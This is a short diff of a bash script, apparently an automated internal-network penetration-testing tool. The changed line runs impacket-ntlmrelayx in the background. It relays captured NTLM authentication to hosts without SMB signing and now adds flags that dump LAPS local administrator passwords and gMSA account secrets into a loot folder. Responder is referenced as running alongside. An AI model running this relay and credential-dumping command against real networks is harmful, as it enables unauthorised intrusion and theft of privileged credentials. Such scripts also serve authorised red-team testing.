@@ -43,7 +43,7 @@ if [-s output/smb_sign_off.txt]
 
 	#NTLMRelayX with 300sec timeout in bg to relay ntlm to hosts without signing enabled
 	echo 'Starting NTLM-Relay'
-	timeout 300 impacket-ntlmrelayx -l loot -of output/ntlm_relay_ntlmv2.txt --remove-mic -smb2support -tf output/smb_sign_off.txt > /dev/null 2>&1 &
+	timeout 300 impacket-ntlmrelayx -6 -ts -ra --dump-laps --dump-gmsa -l loot -of output/ntlm_relay_ntlmv2.txt --remove-mic -smb2support -tf output/smb_sign_off.txt > /dev/null 2>&1 &
 	echo ''
 
 	#Declaring variables for each PID of Responder and NTLMRelayX
